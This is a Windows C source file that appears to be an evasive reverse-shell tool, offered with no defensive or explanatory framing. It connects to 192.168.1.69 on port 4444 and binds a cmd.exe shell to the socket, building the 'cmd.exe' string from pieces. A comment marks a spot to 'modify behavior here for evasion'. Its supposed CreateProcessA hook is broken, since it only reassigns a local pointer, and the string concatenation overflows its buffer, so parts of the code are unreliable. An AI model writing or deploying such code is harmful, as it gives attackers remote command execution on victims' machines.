#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <psapi.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "psapi.lib")

typedef BOOL (WINAPI *CreateProcessAFunc)(
    LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);

CreateProcessAFunc OriginalCreateProcessA = NULL;

BOOL WINAPI HookedCreateProcessA(
    LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation) {
    
    // Modify behavior here for evasion
    return OriginalCreateProcessA(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes,
                                  bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
}

void InstallHook() {
    HMODULE hModule = GetModuleHandle("kernel32.dll");
    if (hModule) {
        OriginalCreateProcessA = (CreateProcessAFunc)GetProcAddress(hModule, "CreateProcessA");
        DWORD oldProtect;
        VirtualProtect(OriginalCreateProcessA, sizeof(CreateProcessAFunc), PAGE_EXECUTE_READWRITE, &oldProtect);
        OriginalCreateProcessA = HookedCreateProcessA;
        VirtualProtect(OriginalCreateProcessA, sizeof(CreateProcessAFunc), oldProtect, &oldProtect);
    }
}

void ReverseShell(char *ip, int port) {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_port = htons(port);

    connect(sock, (struct sockaddr *)&server, sizeof(server));

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    char ps[] = "cm";
    char pod[] = "d.exe";
    char *P = strcat(ps,pod);
    
    CreateProcess(NULL, P, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    WaitForSingleObject(pi.hProcess, INFINITE);

    closesocket(sock);
    WSACleanup();
}

int main() {
    InstallHook();
    ReverseShell("192.168.1.69", 4444);
    return 0;
}
